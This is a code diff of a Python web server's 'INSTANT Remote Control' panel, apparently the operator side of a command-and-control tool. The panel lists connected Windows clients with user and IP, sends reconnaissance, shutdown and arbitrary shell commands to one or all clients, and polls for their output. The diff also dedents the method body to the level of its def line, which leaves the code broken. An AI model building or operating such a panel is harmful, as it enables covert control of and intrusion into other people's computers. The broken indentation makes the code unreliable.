@@ -793,314 +793,343 @@ class InstantRemoteControlHandler(BaseHTTPRequestHandler):
             self.send_json({'success': False})
 
     def send_control_panel(self):
-        html = '''
-        <!DOCTYPE html>
-        <html>
-        <head>
-            <title>Enhanced Control Panel - INSTANT EXECUTION</title>
-            <style>
-                :root {
-                    --primary: #0078d4;
-                    --success: #28a745;
-                    --danger: #dc3545;
-                    --warning: #ffc107;
-                    --dark: #1e1e1e;
-                    --darker: #2d2d2d;
-                    --light: #f8f9fa;
-                }
+    html = '''
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Enhanced Control Panel - INSTANT EXECUTION</title>
+        <style>
+            :root {
+                --primary: #0078d4;
+                --success: #28a745;
+                --danger: #dc3545;
+                --warning: #ffc107;
+                --dark: #1e1e1e;
+                --darker: #2d2d2d;
+                --light: #f8f9fa;
+            }
+            
+            * { margin: 0; padding: 0; box-sizing: border-box; }
+            
+            body { 
+                font-family: 'Segoe UI', Arial, sans-serif; 
+                background: var(--dark); 
+                color: var(--light); 
+                margin: 0; 
+                padding: 20px;
+                overflow-x: hidden;
+            }
+            
+            .header {
+                background: var(--darker);
+                padding: 20px;
+                border-radius: 10px;
+                margin-bottom: 20px;
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+                border: 1px solid rgba(255,255,255,0.1);
+            }
+            
+            .container { 
+                display: grid; 
+                grid-template-columns: 350px 1fr; 
+                gap: 20px; 
+                height: 90vh; 
+            }
+            
+            .sidebar { 
+                background: var(--darker); 
+                padding: 20px; 
+                border-radius: 10px;
+                display: flex;
+                flex-direction: column;
+                border: 1px solid rgba(255,255,255,0.1);
+            }
+            
+            .main { 
+                display: flex; 
+                flex-direction: column;
+                gap: 20px;
+            }
+            
+            .session-item { 
+                background: rgba(255,255,255,0.05); 
+                padding: 15px; 
+                margin: 8px 0; 
+                border-radius: 8px; 
+                cursor: pointer;
+                border: 2px solid transparent;
+                transition: all 0.2s ease;
+                position: relative;
+            }
+            
+            .session-item:hover {
+                background: rgba(255,255,255,0.1);
+                border-color: var(--primary);
+                transform: translateY(-1px);
+            }
+            
+            .session-item.active { 
+                border: 2px solid var(--success);
+                background: rgba(40, 167, 69, 0.1);
+            }
+            
+            .session-item.offline {
+                opacity: 0.6;
+                border-color: var(--danger);
+            }
+            
+            .online-status {
+                position: absolute;
+                top: 10px;
+                right: 10px;
+                width: 12px;
+                height: 12px;
+                border-radius: 50%;
+                background: var(--success);
+                animation: pulse 2s infinite;
+            }
+            
+            @keyframes pulse {
+                0% { opacity: 1; }
+                50% { opacity: 0.5; }
+                100% { opacity: 1; }
+            }
+            
+            .online-status.offline {
+                background: var(--danger);
+                animation: none;
+            }
+            
+            .terminal { 
+                background: #000; 
+                color: #00ff00; 
+                padding: 20px; 
+                border-radius: 8px; 
+                font-family: 'Consolas', monospace; 
+                flex: 1; 
+                overflow-y: auto; 
+                white-space: pre-wrap;
+                font-size: 14px;
+                min-height: 400px;
+                border: 1px solid rgba(0,255,0,0.2);
+            }
+            
+            button { 
+                background: var(--primary); 
+                color: white; 
+                border: none; 
+                padding: 12px 16px; 
+                margin: 4px; 
+                border-radius: 6px; 
+                cursor: pointer;
+                transition: all 0.2s ease;
+                font-weight: 500;
+                border: 1px solid rgba(255,255,255,0.1);
+            }
+            
+            button:hover {
+                transform: translateY(-2px);
+                box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+            }
+            
+            button.danger { 
+                background: var(--danger); 
+                border: 1px solid rgba(220,53,69,0.3);
+            }
+            
+            button.success { 
+                background: var(--success); 
+                border: 1px solid rgba(40,167,69,0.3);
+            }
+            
+            button.warning { 
+                background: var(--warning); 
+                color: #000; 
+                border: 1px solid rgba(255,193,7,0.3);
+            }
+            
+            .controls-grid {
+                display: grid;
+                grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+                gap: 8px;
+                margin: 15px 0;
+            }
+            
+            .command-input { 
+                display: flex; 
+                margin: 15px 0; 
+                gap: 10px;
+            }
+            
+            .command-input input { 
+                flex: 1; 
+                padding: 12px; 
+                background: rgba(255,255,255,0.1); 
+                color: white; 
+                border: 1px solid rgba(255,255,255,0.2); 
+                border-radius: 6px;
+                font-family: 'Consolas', monospace;
+            }
+            
+            .command-input input:focus {
+                outline: none;
+                border-color: var(--primary);
+                background: rgba(255,255,255,0.15);
+            }
+            
+            .stats {
+                display: grid;
+                grid-template-columns: repeat(3, 1fr);
+                gap: 10px;
+                margin: 15px 0;
+            }
+            
+            .stat-card {
+                background: var(--darker);
+                padding: 15px;
+                border-radius: 8px;
+                text-align: center;
+                border: 1px solid rgba(255,255,255,0.1);
+            }
+            
+            .multi-control {
+                background: var(--darker);
+                padding: 15px;
+                border-radius: 8px;
+                margin: 10px 0;
+                border: 1px solid rgba(255,255,255,0.1);
+            }
+            
+            .security-badge {
+                background: linear-gradient(135deg, #28a745, #20c997);
+                padding: 5px 10px;
+                border-radius: 15px;
+                font-size: 12px;
+                margin-left: 10px;
+            }
+            
+            .settings-btn {
+                background: linear-gradient(135deg, #17a2b8, #138496) !important;
+                margin-left: 10px;
+                border: 1px solid rgba(23,162,184,0.3) !important;
+            }
+            
+            .speed-indicator {
+                background: linear-gradient(135deg, #28a745, #20c997);
+                padding: 3px 8px;
+                border-radius: 10px;
+                font-size: 10px;
+                margin-left: 5px;
+            }
+            
+            .instant-badge {
+                background: linear-gradient(135deg, #dc3545, #c82333);
+                padding: 3px 8px;
+                border-radius: 10px;
+                font-size: 10px;
+                margin-left: 5px;
+                animation: blink 1s infinite;
+            }
+            
+            @keyframes blink {
+                0%, 100% { opacity: 1; }
+                50% { opacity: 0.7; }
+            }
+
+            /* إصلاح الألوان للعناصر النشطة */
+            .client-info {
+                color: var(--success) !important;
+                font-weight: bold;
+            }
+
+            .status-online {
+                color: var(--success) !important;
+            }
+
+            .status-offline {
+                color: var(--danger) !important;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="header">
+            <h2>⚡ INSTANT Remote Control <span class="instant-badge">0ms DELAY</span></h2>
+            <div>
+                <button onclick="loadSessions()">🔄 Refresh List</button>
+                <button onclick="executeAll('sysinfo')">🌐 System Info All</button>
+                <button class="settings-btn" onclick="openSettings()">⚙️ Security Settings</button>
+                <button class="warning" onclick="logout()">🚪 Logout</button>
+            </div>
+        </div>
+        
+        <div class="container">
+            <div class="sidebar">
+                <h3>📡 Connected Clients <span class="speed-indicator">LIVE</span> (<span id="clientsCount">0</span>)</h3>
+                <div id="sessionsList" style="flex: 1; overflow-y: auto; max-height: 500px;">
+                    <div style="text-align: center; color: #666; padding: 20px;">
+                        Loading clients...
+                    </div>
+                </div>
                 
-                * { margin: 0; padding: 0; box-sizing: border-box; }
-                
-                body { 
-                    font-family: 'Segoe UI', Arial, sans-serif; 
-                    background: var(--dark); 
-                    color: var(--light); 
-                    margin: 0; 
-                    padding: 20px;
-                    overflow-x: hidden;
-                }
-                
-                .header {
-                    background: var(--darker);
-                    padding: 20px;
-                    border-radius: 10px;
-                    margin-bottom: 20px;
-                    display: flex;
-                    justify-content: space-between;
-                    align-items: center;
-                    border: 1px solid rgba(255,255,255,0.1);
-                }
-                
-                .container { 
-                    display: grid; 
-                    grid-template-columns: 350px 1fr; 
-                    gap: 20px; 
-                    height: 90vh; 
-                }
-                
-                .sidebar { 
-                    background: var(--darker); 
-                    padding: 20px; 
-                    border-radius: 10px;
-                    display: flex;
-                    flex-direction: column;
-                    border: 1px solid rgba(255,255,255,0.1);
-                }
-                
-                .main { 
-                    display: flex; 
-                    flex-direction: column;
-                    gap: 20px;
-                }
-                
-                .session-item { 
-                    background: rgba(255,255,255,0.05); 
-                    padding: 15px; 
-                    margin: 8px 0; 
-                    border-radius: 8px; 
-                    cursor: pointer;
-                    border: 2px solid transparent;
-                    transition: all 0.2s ease;
-                    position: relative;
-                }
-                
-                .session-item:hover {
-                    background: rgba(255,255,255,0.1);
-                    border-color: var(--primary);
-                    transform: translateY(-1px);
-                }
-                
-                .session-item.active { 
-                    border: 2px solid var(--success);
-                    background: rgba(40, 167, 69, 0.1);
-                }
-                
-                .session-item.offline {
-                    opacity: 0.6;
-                    border-color: var(--danger);
-                }
-                
-                .online-status {
-                    position: absolute;
-                    top: 10px;
-                    right: 10px;
-                    width: 10px;
-                    height: 10px;
-                    border-radius: 50%;
-                    background: var(--success);
-                    animation: pulse 2s infinite;
-                }
-                
-                @keyframes pulse {
-                    0% { opacity: 1; }
-                    50% { opacity: 0.5; }
-                    100% { opacity: 1; }
-                }
-                
-                .online-status.offline {
-                    background: var(--danger);
-                    animation: none;
-                }
-                
-                .terminal { 
-                    background: #000; 
-                    color: #00ff00; 
-                    padding: 20px; 
-                    border-radius: 8px; 
-                    font-family: 'Consolas', monospace; 
-                    flex: 1; 
-                    overflow-y: auto; 
-                    white-space: pre-wrap;
-                    font-size: 14px;
-                    min-height: 400px;
-                    border: 1px solid rgba(0,255,0,0.2);
-                }
-                
-                button { 
-                    background: var(--primary); 
-                    color: white; 
-                    border: none; 
-                    padding: 12px 16px; 
-                    margin: 4px; 
-                    border-radius: 6px; 
-                    cursor: pointer;
-                    transition: all 0.2s ease;
-                    font-weight: 500;
-                }
-                
-                button:hover {
-                    transform: translateY(-2px);
-                    box-shadow: 0 4px 12px rgba(0,0,0,0.3);
-                }
-                
-                button.danger { background: var(--danger); }
-                button.success { background: var(--success); }
-                button.warning { background: var(--warning); color: #000; }
-                
-                .controls-grid {
-                    display: grid;
-                    grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
-                    gap: 8px;
-                    margin: 15px 0;
-                }
-                
-                .command-input { 
-                    display: flex; 
-                    margin: 15px 0; 
-                    gap: 10px;
-                }
-                
-                .command-input input { 
-                    flex: 1; 
-                    padding: 12px; 
-                    background: rgba(255,255,255,0.1); 
-                    color: white; 
-                    border: 1px solid rgba(255,255,255,0.2); 
-                    border-radius: 6px;
-                    font-family: 'Consolas', monospace;
-                }
-                
-                .command-input input:focus {
-                    outline: none;
-                    border-color: var(--primary);
-                }
-                
-                .stats {
-                    display: grid;
-                    grid-template-columns: repeat(3, 1fr);
-                    gap: 10px;
-                    margin: 15px 0;
-                }
-                
-                .stat-card {
-                    background: var(--darker);
-                    padding: 15px;
-                    border-radius: 8px;
-                    text-align: center;
-                    border: 1px solid rgba(255,255,255,0.1);
-                }
-                
-                .multi-control {
-                    background: var(--darker);
-                    padding: 15px;
-                    border-radius: 8px;
-                    margin: 10px 0;
-                    border: 1px solid rgba(255,255,255,0.1);
-                }
-                
-                .security-badge {
-                    background: linear-gradient(135deg, #28a745, #20c997);
-                    padding: 5px 10px;
-                    border-radius: 15px;
-                    font-size: 12px;
-                    margin-left: 10px;
-                }
-                
-                .settings-btn {
-                    background: linear-gradient(135deg, #17a2b8, #138496) !important;
-                    margin-left: 10px;
-                }
-                
-                .speed-indicator {
-                    background: linear-gradient(135deg, #28a745, #20c997);
-                    padding: 3px 8px;
-                    border-radius: 10px;
-                    font-size: 10px;
-                    margin-left: 5px;
-                }
-                
-                .instant-badge {
-                    background: linear-gradient(135deg, #dc3545, #c82333);
-                    padding: 3px 8px;
-                    border-radius: 10px;
-                    font-size: 10px;
-                    margin-left: 5px;
-                    animation: blink 1s infinite;
-                }
-                
-                @keyframes blink {
-                    0%, 100% { opacity: 1; }
-                    50% { opacity: 0.5; }
-                }
-            </style>
-        </head>
-        <body>
-            <div class="header">
-                <h2>⚡ INSTANT Remote Control <span class="instant-badge">0ms DELAY</span></h2>
-                <div>
-                    <button onclick="loadSessions()">Refresh List</button>
-                    <button onclick="executeAll('sysinfo')">System Info All</button>
-                    <button class="settings-btn" onclick="openSettings()">Security Settings</button>
-                    <button class="warning" onclick="logout()">Logout</button>
+                <div class="stats">
+                    <div class="stat-card">
+                        <div style="font-size: 24px; font-weight: bold; color: var(--primary)" id="totalClients">0</div>
+                        <small>Total Clients</small>
+                    </div>
+                    <div class="stat-card">
+                        <div style="font-size: 24px; font-weight: bold; color: var(--success)" id="activeClients">0</div>
+                        <small>Active</small>
+                    </div>
+                    <div class="stat-card">
+                        <div style="font-size: 24px; font-weight: bold; color: var(--warning)" id="commandsSent">0</div>
+                        <small>Commands</small>
+                    </div>
                 </div>
             </div>
             
-            <div class="container">
-                <div class="sidebar">
-                    <h3>Connected Clients <span class="speed-indicator">LIVE</span> (<span id="clientsCount">0</span>)</h3>
-                    <div id="sessionsList" style="flex: 1; overflow-y: auto; max-height: 500px;">
-                        <div style="text-align: center; color: #666; padding: 20px;">
-                            Loading clients...
+            <div class="main">
+                <div style="background: var(--darker); padding: 20px; border-radius: 10px; border: 1px solid rgba(255,255,255,0.1);">
+                    <h3>🎯 Selected Client: <span id="currentClient" style="color: var(--success); font-weight: bold;">Not Selected</span></h3>
+                    
+                    <div class="multi-control">
+                        <strong>⚡ Instant Commands <span class="instant-badge">0ms</span>:</strong>
+                        <div class="controls-grid">
+                            <button onclick="executeCommand('sysinfo')">🖥️ System Info</button>
+                            <button onclick="executeCommand('whoami')">👤 Current User</button>
+                            <button onclick="executeCommand('ipconfig /all')">🌐 Network Info</button>
+                            <button onclick="executeCommand('dir')">📁 Files List</button>
+                            <button onclick="executeCommand('tasklist')">📊 Active Processes</button>
+                            <button onclick="executeCommand('netstat -an')">🔗 Network Connections</button>
+                            <button onclick="executeCommand('systeminfo')">⚙️ System Details</button>
+                            <button onclick="executeCommand('wmic logicaldisk get size,freespace,caption')">💾 Disk Space</button>
+                            <button onclick="executeCommand('net user')">👥 Users</button>
+                            <button onclick="executeCommand('net localgroup administrators')">🛡️ Administrators</button>
+                            <button onclick="executeCommand('ping google.com')">📶 Connection Test</button>
+                            <button onclick="executeCommand('calc')">🧮 Calculator</button>
+                            <button onclick="executeCommand('notepad')">📝 Notepad</button>
+                            <button onclick="executeCommand('cmd /c start')">💻 New CMD</button>
+                            <button onclick="executeCommand('shutdown /a')">❌ Cancel Shutdown</button>
+                            <button class="danger" onclick="executeCommand('shutdown /s /t 60')">⏰ Shutdown 1m</button>
+                            <button class="danger" onclick="executeCommand('shutdown /r /t 30')">🔄 Restart</button>
+                            <button onclick="executeCommand('powershell Get-Process | Sort-Object CPU -Descending | Select-Object -First 10')">📈 Top Processes</button>
+                            <button onclick="executeCommand('wmic product get name,version')">📦 Installed Software</button>
+                            <button onclick="executeCommand('net start')">🔧 Active Services</button>
+                            <button onclick="executeCommand('schtasks /query /fo LIST')">⏰ Scheduled Tasks</button>
+                            <button onclick="executeCommand('reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"')">🚀 Startup Programs</button>
                         </div>
                     </div>
                     
-                    <div class="stats">
-                        <div class="stat-card">
-                            <div style="font-size: 24px; font-weight: bold;" id="totalClients">0</div>
-                            <small>Total Clients</small>
-                        </div>
-                        <div class="stat-card">
-                            <div style="font-size: 24px; font-weight: bold;" id="activeClients">0</div>
-                            <small>Active</small>
-                        </div>
-                        <div class="stat-card">
-                            <div style="font-size: 24px; font-weight: bold;" id="commandsSent">0</div>
-                            <small>Commands</small>
-                        </div>
+                    <div class="command-input">
+                        <input type="text" id="commandInput" placeholder="💬 Enter custom command (INSTANT 0ms execution)" 
+                               onkeypress="if(event.key=='Enter') executeCustomCommand()">
+                        <button onclick="executeCustomCommand()">⚡ Execute Command</button>
+                        <button class="success" onclick="executeSelected('commandInput')">🎯 Execute on Selected</button>
                     </div>
                 </div>
                 
-                <div class="main">
-                    <div style="background: var(--darker); padding: 20px; border-radius: 10px; border: 1px solid rgba(255,255,255,0.1);">
-                        <h3>Selected Client: <span id="currentClient" style="color: var(--success);">Not Selected</span></h3>
-                        
-                        <div class="multi-control">
-                            <strong>Instant Commands <span class="instant-badge">0ms</span>:</strong>
-                            <div class="controls-grid">
-                                <button onclick="executeCommand('sysinfo')">System Info</button>
-                                <button onclick="executeCommand('whoami')">Current User</button>
-                                <button onclick="executeCommand('ipconfig /all')">Network Info</button>
-                                <button onclick="executeCommand('dir')">Files List</button>
-                                <button onclick="executeCommand('tasklist')">Active Processes</button>
-                                <button onclick="executeCommand('netstat -an')">Network Connections</button>
-                                <button onclick="executeCommand('systeminfo')">System Details</button>
-                                <button onclick="executeCommand('wmic logicaldisk get size,freespace,caption')">Disk Space</button>
-                                <button onclick="executeCommand('net user')">Users</button>
-                                <button onclick="executeCommand('net localgroup administrators')">Administrators</button>
-                                <button onclick="executeCommand('ping google.com')">Connection Test</button>
-                                <button onclick="executeCommand('calc')">Calculator</button>
-                                <button onclick="executeCommand('notepad')">Notepad</button>
-                                <button onclick="executeCommand('cmd /c start')">New CMD</button>
-                                <button onclick="executeCommand('shutdown /a')">Cancel Shutdown</button>
-                                <button class="danger" onclick="executeCommand('shutdown /s /t 60')">Shutdown 1m</button>
-                                <button class="danger" onclick="executeCommand('shutdown /r /t 30')">Restart</button>
-                                <button onclick="executeCommand('powershell Get-Process | Sort-Object CPU -Descending | Select-Object -First 10')">Top Processes</button>
-                                <button onclick="executeCommand('wmic product get name,version')">Installed Software</button>
-                                <button onclick="executeCommand('net start')">Active Services</button>
-                                <button onclick="executeCommand('schtasks /query /fo LIST')">Scheduled Tasks</button>
-                                <button onclick="executeCommand('reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"')">Startup Programs</button>
-                            </div>
-                        </div>
-                        
-                        <div class="command-input">
-                            <input type="text" id="commandInput" placeholder="Enter custom command (INSTANT 0ms execution)" 
-                                   onkeypress="if(event.key=='Enter') executeCustomCommand()">
-                            <button onclick="executeCustomCommand()">Execute Command</button>
-                            <button class="success" onclick="executeSelected('commandInput')">Execute on Selected</button>
-                        </div>
-                    </div>
-                    
-                    <div class="terminal" id="terminal">
+                <div class="terminal" id="terminal">
 ⚡ INSTANT REMOTE CONTROL SYSTEM READY - 0ms DELAY
 
 • Select a client from the left panel
@@ -1109,188 +1138,200 @@ class InstantRemoteControlHandler(BaseHTTPRequestHandler):
 • All activities are logged for security
 • 🚀 ULTRA INSTANT mode activated
 
-                    </div>
                 </div>
             </div>
+        </div>
+        
+        <script>
+            let currentClientId = null;
+            let commandCounter = 0;
+            let allClients = [];
             
-            <script>
-                let currentClientId = null;
-                let commandCounter = 0;
-                let allClients = [];
-                
-                async function loadSessions() {
-                    try {
-                        const response = await fetch('/sessions?_t=' + Date.now());
-                        const sessions = await response.json();
-                        allClients = sessions;
-                        updateSessionStats(sessions);
-                        const list = document.getElementById('sessionsList');
+            async function loadSessions() {
+                try {
+                    const response = await fetch('/sessions?_t=' + Date.now());
+                    const sessions = await response.json();
+                    allClients = sessions;
+                    updateSessionStats(sessions);
+                    const list = document.getElementById('sessionsList');
+                    
+                    if (sessions.length === 0) {
+                        list.innerHTML = '<div style="text-align:center;color:#666;padding:20px;">No clients connected</div>';
+                        return;
+                    }
+                    
+                    list.innerHTML = sessions.map(client => {
+                        const isActive = (Date.now() - new Date(client.last_seen).getTime()) < 10000; // ⚡ 10 seconds
+                        const isSelected = client.id === currentClientId;
+                        const statusClass = isActive ? 'online-status' : 'online-status offline';
                         
-                        if (sessions.length === 0) {
-                            list.innerHTML = '<div style="text-align:center;color:#666;padding:20px;">No clients connected</div>';
-                            return;
-                        }
-                        
-                        list.innerHTML = sessions.map(client => {
-                            const isActive = (Date.now() - new Date(client.last_seen).getTime()) < 10000; // ⚡ 10 seconds
-                            const isSelected = client.id === currentClientId;
-                            const statusClass = isActive ? 'online-status' : 'online-status offline';
-                            
-                            return `
-                                <div class="session-item ${isSelected ? 'active' : ''} ${!isActive ? 'offline' : ''}" 
-                                     onclick="selectClient('${client.id}')">
-                                    <div class="${statusClass}"></div>
-                                    <strong>${client.computer || client.id}</strong><br>
-                                    <small>User: ${client.user || 'Unknown'}</small><br>
-                                    <small>OS: ${client.os || 'Unknown'}</small><br>
-                                    <small>IP: ${client.ip}</small><br>
-                                    <small>Last Active: ${new Date(client.last_seen).toLocaleTimeString()}</small>
-                                </div>
-                            `;
-                        }).join('');
-                    } catch (error) {
-                        console.error('Error loading sessions:', error);
-                    }
+                        return `
+                            <div class="session-item ${isSelected ? 'active' : ''} ${!isActive ? 'offline' : ''}" 
+                                 onclick="selectClient('${client.id}')">
+                                <div class="${statusClass}"></div>
+                                <strong style="color: ${isActive ? '#28a745' : '#dc3545'}">${client.computer || client.id}</strong><br>
+                                <small>User: ${client.user || 'Unknown'}</small><br>
+                                <small>OS: ${client.os || 'Unknown'}</small><br>
+                                <small>IP: ${client.ip}</small><br>
+                                <small>Last Active: ${new Date(client.last_seen).toLocaleTimeString()}</small>
+                            </div>
+                        `;
+                    }).join('');
+                } catch (error) {
+                    console.error('Error loading sessions:', error);
                 }
+            }
+            
+            function updateSessionStats(sessions) {
+                const total = sessions.length;
+                const active = sessions.filter(c => (Date.now() - new Date(c.last_seen).getTime()) < 10000).length;
                 
-                function updateSessionStats(sessions) {
-                    const total = sessions.length;
-                    const active = sessions.filter(c => (Date.now() - new Date(c.last_seen).getTime()) < 10000).length;
-                    
-                    document.getElementById('totalClients').textContent = total;
-                    document.getElementById('activeClients').textContent = active;
-                    document.getElementById('commandsSent').textContent = commandCounter;
-                    document.getElementById('clientsCount').textContent = total;
-                }
-                
-                function selectClient(clientId) {
-                    currentClientId = clientId;
-                    loadSessions();
-                    document.getElementById('currentClient').textContent = clientId;
-                    addToTerminal(`Selected client: ${clientId}\\n`);
-                }
-                
-                function executeCommand(command) {
-                    if (!currentClientId) return alert('Please select a client first!');
-                    executeSingleCommand(currentClientId, command);
-                }
-                
-                async function executeSingleCommand(clientId, command) {
-                    commandCounter++;
-                    const startTime = Date.now();
-                    addToTerminal(`⚡ [${clientId}] ${command}\\n`);
-                    
-                    try {
-                        const response = await fetch('/execute', {
-                            method: 'POST',
-                            headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify({client_id: clientId, command: command})
-                        });
-                        
-                        const data = await response.json();
-                        if (data.success) {
-                            addToTerminal(`✅ Command sent INSTANTLY\\n`);
-                            waitForResult(clientId, command, startTime);
-                        } else {
-                            addToTerminal(`❌ Error: ${data.error}\\n`);
-                        }
-                    } catch (err) {
-                        addToTerminal(`❌ Network error: ${err}\\n`);
-                    }
-                }
-                
-                function executeAll(command) {
-                    if (allClients.length === 0) return alert('No clients connected!');
-                    
-                    const activeClients = allClients.filter(c => (Date.now() - new Date(c.last_seen).getTime()) < 10000);
-                    if (activeClients.length === 0) return alert('No active clients!');
-                    
-                    addToTerminal(`⚡ Executing command on ${activeClients.length} clients: ${command}\\n`);
-                    
-                    activeClients.forEach(client => {
-                        executeSingleCommand(client.id, command);
-                    });
-                }
-                
-                function executeSelected(inputId) {
-                    const command = document.getElementById(inputId).value.trim();
-                    if (!command) return alert('Please enter a command');
-                    
-                    if (currentClientId) {
-                        executeCommand(command);
-                    } else {
-                        alert('Please select a client first');
-                    }
-                }
-                
-                function executeCustomCommand() {
-                    const cmd = document.getElementById('commandInput').value.trim();
-                    if (cmd) {
-                        executeCommand(cmd);
-                        document.getElementById('commandInput').value = '';
-                    } else {
-                        alert('Please enter a command');
-                    }
-                }
-                
-                function waitForResult(clientId, command, startTime) {
-                    let attempts = 0;
-                    const maxAttempts = 50; // ⚡ More attempts for instant response
-                    
-                    const checkImmediately = async () => {
-                        attempts++;
-                        if (attempts > maxAttempts) {
-                            const elapsed = (Date.now() - startTime);
-                            addToTerminal(`⏰ Timeout after ${elapsed}ms: No response from ${clientId}\\n`);
-                            return;
-                        }
-                        
-                        try {
-                            const response = await fetch('/result?client=' + clientId + '&command=' + encodeURIComponent(command) + '&_t=' + Date.now());
-                            const data = await response.json();
-                            
-                            if (data.result) {
-                                const responseTime = (Date.now() - startTime);
-                                addToTerminal(`✅ [${clientId}] Response (${responseTime}ms):\\n${data.result}\\n`);
-                            } else if (data.pending) {
-                                setTimeout(checkImmediately, 5); // ⚡ 5ms delay for instant checking
-                            } else {
-                                setTimeout(checkImmediately, 5);
-                            }
-                        } catch {
-                            setTimeout(checkImmediately, 5);
-                        }
-                    };
-                    checkImmediately();
-                }
-                
-                function addToTerminal(text) {
-                    const terminal = document.getElementById('terminal');
-                    terminal.textContent += text;
-                    terminal.scrollTop = terminal.scrollHeight;
-                }
-                
-                function openSettings() {
-                    window.open('/settings', '_blank');
-                }
-                
-                function logout() {
-                    if (confirm('Are you sure you want to logout?')) {
-                        window.location = '/';
-                    }
-                }
-                
-                // ⚡ Ultra-fast auto-refresh every 1 second
-                setInterval(loadSessions, 1000);
+                document.getElementById('totalClients').textContent = total;
+                document.getElementById('activeClients').textContent = active;
+                document.getElementById('commandsSent').textContent = commandCounter;
+                document.getElementById('clientsCount').textContent = total;
+            }
+            
+            function selectClient(clientId) {
+                currentClientId = clientId;
                 loadSessions();
-            </script>
-        </body>
-        </html>
-        '''
-        self.send_response(200)
-        self.send_header('Content-type', 'text/html')
-        self.end_headers()
-        self.wfile.write(html.encode())
+                document.getElementById('currentClient').textContent = clientId;
+                addToTerminal(`🎯 Selected client: ${clientId}\\n`);
+            }
+            
+            function executeCommand(command) {
+                if (!currentClientId) {
+                    alert('⚠️ Please select a client first!');
+                    return;
+                }
+                executeSingleCommand(currentClientId, command);
+            }
+            
+            async function executeSingleCommand(clientId, command) {
+                commandCounter++;
+                const startTime = Date.now();
+                addToTerminal(`⚡ [${clientId}] ${command}\\n`);
+                
+                try {
+                    const response = await fetch('/execute', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({client_id: clientId, command: command})
+                    });
+                    
+                    const data = await response.json();
+                    if (data.success) {
+                        addToTerminal(`✅ Command sent INSTANTLY\\n`);
+                        waitForResult(clientId, command, startTime);
+                    } else {
+                        addToTerminal(`❌ Error: ${data.error}\\n`);
+                    }
+                } catch (err) {
+                    addToTerminal(`❌ Network error: ${err}\\n`);
+                }
+            }
+            
+            function executeAll(command) {
+                if (allClients.length === 0) {
+                    alert('⚠️ No clients connected!');
+                    return;
+                }
+                
+                const activeClients = allClients.filter(c => (Date.now() - new Date(c.last_seen).getTime()) < 10000);
+                if (activeClients.length === 0) {
+                    alert('⚠️ No active clients!');
+                    return;
+                }
+                
+                addToTerminal(`⚡ Executing command on ${activeClients.length} clients: ${command}\\n`);
+                
+                activeClients.forEach(client => {
+                    executeSingleCommand(client.id, command);
+                });
+            }
+            
+            function executeSelected(inputId) {
+                const command = document.getElementById(inputId).value.trim();
+                if (!command) {
+                    alert('⚠️ Please enter a command');
+                    return;
+                }
+                
+                if (currentClientId) {
+                    executeCommand(command);
+                } else {
+                    alert('⚠️ Please select a client first');
+                }
+            }
+            
+            function executeCustomCommand() {
+                const cmd = document.getElementById('commandInput').value.trim();
+                if (cmd) {
+                    executeCommand(cmd);
+                    document.getElementById('commandInput').value = '';
+                } else {
+                    alert('⚠️ Please enter a command');
+                }
+            }
+            
+            function waitForResult(clientId, command, startTime) {
+                let attempts = 0;
+                const maxAttempts = 100; // ⚡ More attempts for instant response
+                
+                const checkImmediately = async () => {
+                    attempts++;
+                    if (attempts > maxAttempts) {
+                        const elapsed = (Date.now() - startTime);
+                        addToTerminal(`⏰ Timeout after ${elapsed}ms: No response from ${clientId}\\n`);
+                        return;
+                    }
+                    
+                    try {
+                        const response = await fetch('/result?client=' + clientId + '&command=' + encodeURIComponent(command) + '&_t=' + Date.now());
+                        const data = await response.json();
+                        
+                        if (data.result) {
+                            const responseTime = (Date.now() - startTime);
+                            addToTerminal(`✅ [${clientId}] Response (${responseTime}ms):\\n${data.result}\\n`);
+                        } else if (data.pending) {
+                            setTimeout(checkImmediately, 10); // ⚡ 10ms delay for instant checking
+                        } else {
+                            setTimeout(checkImmediately, 10);
+                        }
+                    } catch {
+                        setTimeout(checkImmediately, 10);
+                    }
+                };
+                checkImmediately();
+            }
+            
+            function addToTerminal(text) {
+                const terminal = document.getElementById('terminal');
+                terminal.textContent += text;
+                terminal.scrollTop = terminal.scrollHeight;
+            }
+            
+            function openSettings() {
+                window.open('/settings', '_blank');
+            }
+            
+            function logout() {
+                if (confirm('Are you sure you want to logout?')) {
+                    window.location = '/';
+                }
+            }
+            
+            // ⚡ Ultra-fast auto-refresh every 1 second
+            setInterval(loadSessions, 1000);
+            loadSessions();
+        </script>
+    </body>
+    </html>
+    '''
+    self.send_response(200)
+    self.send_header('Content-type', 'text/html')
+    self.end_headers()
+    self.wfile.write(html.encode())
     
     def send_remote_client(self):
         html = '''
